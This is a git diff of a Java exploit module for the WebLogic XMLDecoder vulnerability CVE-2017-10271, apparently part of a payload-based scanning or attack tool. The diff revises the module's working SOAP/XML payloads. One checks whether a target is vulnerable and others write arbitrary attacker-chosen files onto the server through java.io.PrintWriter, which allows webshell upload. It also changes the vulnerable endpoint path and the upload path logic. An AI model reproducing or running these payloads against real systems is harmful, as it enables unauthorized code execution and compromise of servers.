@@ -14,7 +14,7 @@ import java.util.Random;
  */
 public class CVE_2017_10271_10 implements BasePayload {
     private static final String CheckStr="xmldecoder_vul_test"; 
-    private static final String VULURL="/wls-wsat/CoordinatorPortType";
+    private static final String VULURL="/wls-wsat/CoordinatorPortType11";
     private static final String FileAbsPath="/wls-wsat/"; 
     private static final String UploadCheckStr="xml_upload_ok";
     
@@ -26,7 +26,10 @@ public class CVE_2017_10271_10 implements BasePayload {
 "                <void class=\"java.lang.Thread\" method=\"currentThread\">\n" +
 "                    <void method=\"getCurrentWork\">\n" +
 "                        <void method=\"getResponse\">\n" +
-"                            <void method=\"getWriter\"><void method=\"write\"><string>xmldecoder_vul_test</string></void></void>\n" +
+"                            <void method=\"getServletOutputStream\">\n" +
+"                                <void method=\"flush\"/>\n" +
+"                            </void>\n" +
+"                            <void method=\"getWriter\"><void method=\"write\"><string>"+CheckStr+"</string></void></void>\n" +
 "                        </void>\n" +
 "                    </void>\n" +
 "                </void>\n" +
@@ -74,8 +77,8 @@ public class CVE_2017_10271_10 implements BasePayload {
 "</soapenv:Envelope>";
     
     private static Random  rand=new Random();
-    private static String UploadFile_VUL_WebPath="<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Header><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java><void class=\"java.lang.Thread\" method=\"currentThread\"><void method=\"getCurrentWork\"><void method=\"getContext\"><void method=\"getRootTempDir\"><void method=\"getAbsolutePath\"><void method=\"concat\" id=\"path\"><string>/war/%s</string></void></void></void></void></void></void><object class=\"java.io.PrintWriter\"><object idref=\"path\"></object><void method=\"println\"><string><![CDATA[%s]]></string></void><void method=\"close\"/></object><void class=\"java.lang.Thread\" method=\"currentThread\"><void method=\"getCurrentWork\"><void method=\"getResponse\"><void method=\"getWriter\"><void method=\"write\"><string>"+UploadCheckStr+"</string></void></void></void></void></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>";
-    private static String UploadFile_VUL_UserPath="<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Header><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java><object class=\"java.io.PrintWriter\"><string>%s</string><void method=\"println\"><string><![CDATA[%s]]></string></void><void method=\"close\"/></object><void class=\"java.lang.Thread\" method=\"currentThread\"><void method=\"getCurrentWork\"><void method=\"getResponse\"><void method=\"getWriter\"><void method=\"write\"><string>"+UploadCheckStr+"</string></void></void></void></void></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>";
+    private static String UploadFile_VUL_WebPath="<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Header><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java><void class=\"java.lang.Thread\" method=\"currentThread\"><void method=\"getCurrentWork\"><void method=\"getContext\"><void method=\"getRootTempDir\"><void method=\"getAbsolutePath\"><void method=\"concat\" id=\"path\"><string>/war/%s</string></void></void></void></void></void></void><object class=\"java.io.PrintWriter\"><object idref=\"path\"></object><void method=\"println\"><string><![CDATA[%s]]></string></void><void method=\"close\"/></object><void class=\"java.lang.Thread\" method=\"currentThread\"><void method=\"getCurrentWork\"><void method=\"getResponse\"><void method=\"getServletOutputStream\"><void method=\"flush\"/></void><void method=\"getWriter\"><void method=\"write\"><string>"+UploadCheckStr+"</string></void></void></void></void></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>";
+    private static String UploadFile_VUL_UserPath="<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Header><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java><object class=\"java.io.PrintWriter\"><string>%s</string><void method=\"println\"><string><![CDATA[%s]]></string></void><void method=\"close\"/></object><void class=\"java.lang.Thread\" method=\"currentThread\"><void method=\"getCurrentWork\"><void method=\"getResponse\"><void method=\"getServletOutputStream\"><void method=\"flush\"/></void><void method=\"getWriter\"><void method=\"write\"><string>"+UploadCheckStr+"</string></void></void></void></void></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>";
     private static String Path_VUL="<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Header><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n" +
 "<java>\n" +
 "<void class=\"java.lang.Thread\" method=\"currentThread\">\n" +
@@ -93,17 +96,19 @@ public class CVE_2017_10271_10 implements BasePayload {
 "</void> <void class=\"java.lang.Thread\" method=\"currentThread\">\n" +
 "                    <void method=\"getCurrentWork\">\n" +
 "                        <void method=\"getResponse\">\n" +
+"                            <void method=\"getServletOutputStream\">\n" +
+"                                <void method=\"flush\"/>\n" +
+"                            </void>\n" +
 "                            <void method=\"getWriter\"><void method=\"write\"><string idref=\"path\"></string></void></void>\n" +
 "                        </void>\n" +
 "                    </void>\n" +
-"                </void>\n" +
+"                </void>\n\n" +
 "</java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>";
     
     
     @Override
     public boolean checkVUL(String url) throws Exception{ 
-        try {
-           
+        try {         
             String result=HttpTool.postHttpReuestByXML(url+VULURL, Check_VUL,"UTF-8");
             if(CheckStr.equals(result)){
                     return true;
@@ -133,10 +138,11 @@ public class CVE_2017_10271_10 implements BasePayload {
             String payload="";
             String respath=filename;
             if(useUserPath){
-                respath=url+FileAbsPath+filename;
+                 respath=filename;
                 payload=String.format(UploadFile_VUL_UserPath, filename,fileContent);
             }
             else{
+                respath=url+FileAbsPath+filename;
                 payload=String.format(UploadFile_VUL_WebPath,filename,fileContent);
             }
             String result=HttpTool.postHttpReuestByXML(url+VULURL, payload,"UTF-8");
